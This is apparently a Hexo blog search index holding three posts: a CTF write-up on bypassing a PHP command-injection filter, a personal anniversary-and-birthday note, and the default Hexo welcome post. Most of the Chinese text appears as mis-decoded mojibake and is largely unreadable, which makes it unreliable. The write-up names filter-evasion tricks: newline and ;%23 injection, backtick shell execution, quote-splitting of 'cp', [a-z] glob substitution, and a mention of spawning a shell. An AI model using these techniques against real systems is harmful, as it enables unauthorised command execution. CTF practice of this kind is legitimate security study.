    <content type="html"><![CDATA[<p>é¢˜ç›®æºç æ˜¯è¿™æ ·çš„ï¼ˆè¿™é‡Œå€Ÿé‰´çš„æ˜¯å®˜æ–¹çš„wpï¼Œå› ä¸ºæˆ‘æ²¡å†™å‡ºæ¥wwwwwï¼‰<br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/1.png"><br>è¿™é‡Œæœ‰å‡ ä¸ªé™åˆ¶<br>1.æ³¨é‡Š<br>2.åé¢çš„è„æ•°æ®<br>3.ä¼ å…¥cmdçš„é•¿åº¦è¦åœ¨13ä¸ªå­—ç¬¦ä»¥å†…<br>4.é™åˆ¶å‘½ä»¤æ‰§è¡Œçš„å­—ç¬¦</p><p>é¦–å…ˆæˆ‘ä»¬å…ˆè¿‡æ³¨é‡Šç¬¦<br>åªè¦åŠ ä¸€ä¸ªæ¢è¡Œç¬¦å°±èƒ½ç»•è¿‡äº†ï¼Œ%0a<br>ç„¶åæ˜¯è„æ•°æ®ï¼ŒåŠ ä¸ª ; å’Œæ³¨é‡Š # å³å¯ç»•è¿‡ï¼Œæ³¨æ„ä¼ æ³¨é‡Šç¬¦çš„æ—¶å€™è¦urlç¼–ä¸€ä¸‹ç å°±æ˜¯ ;%23<br>æˆ‘ä»¬é™åˆ¶å·²ç»æ¶ˆè€—æ‰äº†ä¸‰ä¸ªå­—ç¬¦ï¼Œè¿˜æœ‰9ä¸ªå­—ç¬¦å¯ç”¨ï¼Œ9ä¸ªå­—ç¬¦ï¼Œå¸¸è§„çš„æ–¹æ³•æ˜¯å¾ˆéš¾æ„é€ äº†ï¼Œä½†æ˜¯<br>æˆ‘ä»¬æœ‰ä¸ªåå¼•å·<br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/2.png"><br>phpé‡Œçš„åå¼•å·è°ƒç”¨çš„æ˜¯æ–¹æ³• shell_exec() ï¼Œç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨é‡Œé¢<br>æ‰§è¡Œå‘½ä»¤äº†â€¦å—ï¼Ÿ<br>è™½ç„¶å¯ä»¥æ‰§è¡Œæ‰§è¡Œå‘½ä»¤æ¯”å¦‚æˆ‘ä»¬(â€˜.â€™æ˜¯å½“å‰ç›®å½•)<br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/3.png"></p><p>ä¸å¤šä¸å°‘åˆšåˆšå¥½9ä¸ªå­—ç¬¦èƒ½æŠŠæ ¹ç›®å½•é‡Œçš„ä¸œè¥¿å¤åˆ¶è¿‡æ¥ï¼Œç„¶åç›´æ¥è®¿é—®é™æ€èµ„æºflagå°±èƒ½ç›´æ¥è¯»å– äº†ï¼Œä½†æ˜¯éå¸¸å¯æƒœï¼Œä¼šè§¦å‘â€è‚˜æ­»ä½ â€æˆ–è€…â€what can i sayâ€ï¼Œå°±æ²¡æœ‰åŠæ³•æ‹¯æ•‘ç‰¢å¤§äº† é‚£ä¹ˆæˆ‘ä»¬æ¢ä¸€ç§æ€è·¯ï¼Œæˆ‘ä»¬ç”¨å¦ä¸€ä¸ªå˜é‡å¾€é‡Œé¢ä¼ å‚ï¼Œé‚£ä¹ˆå°±èƒ½ä¸å—é•¿åº¦çš„é™åˆ¶è‡ªç”±æ„é€ äº† <br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/4.png"></p><p>æˆ‘ä»¬åªè¦å¾€1ä¼ å‚å°±èƒ½ä¼ åˆ°é‡Œé¢å»ï¼Œå°±èƒ½è‡ªç”±æ‰§è¡Œå‘½ä»¤äº†ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•æ˜¯æ— å›æ˜¾ çš„ï¼Œæ— å›æ˜¾ä¹Ÿé—®é¢˜ä¸å¤§ï¼Œç”¨ä¸Šé¢çš„æ–¹æ³•æŠŠflagå¤åˆ¶ä¸€ä¸‹ç„¶åç›´æ¥è®¿é—®å°±è¡Œï¼Œæˆ–è€…ç›´æ¥å¼¹shell <br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/5.png"></p><p>ç”¨ â€˜â€™ æ¥ç»•è¿‡è¿‡æ»¤çš„ cp ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é€šé…ç¬¦æ˜¯ç»™è¿‡æ»¤äº†çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼•å‡ºç¬¬äºŒä¸ªæŠ€å·§ï¼Œ [a-z] ï¼Œlinuxé‡Œç”¨ä¸­æ‹¬å·å¯ä»¥æ ¹æ®asciiç æ¥åŒ¹é…é‡Œé¢çš„å­—ç¬¦é›†ï¼Œ [a-z] å°±æ˜¯åŒ¹é…ä»»ä½•å°å†™å­—æ¯a åˆ°zä¸­çš„ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½ç®€å•çš„æ„é€ å‡ºæƒ³è¦çš„å­—ç¬¦äº† payload: <br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/6.png"></p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘æœ€çˆ±çš„å®è´</title>
    <link href="/2024/07/14/%E6%88%91%E6%9C%80%E7%88%B1%E7%9A%84%E5%AE%9D%E8%B4%9D/"/>
    <url>/2024/07/14/%E6%88%91%E6%9C%80%E7%88%B1%E7%9A%84%E5%AE%9D%E8%B4%9D/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä¸€èµ·çš„çºªå¿µæ—¥æ˜¯2022.11.09<br>å“‡ä¾¬çš„ç”Ÿæ—¥æ˜¯2005.02.09<img src="/2024/07/14/%E6%88%91%E6%9C%80%E7%88%B1%E7%9A%84%E5%AE%9D%E8%B4%9D/baby.png" alt="å®è´ç”Ÿæ—¥"></p>]]></content>
    
    
    <categories>
      
      <category>ç”Ÿæ´»çš„ç¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å“‡ä¾¬</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/07/13/hello-world/"/>
    <url>/2024/07/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
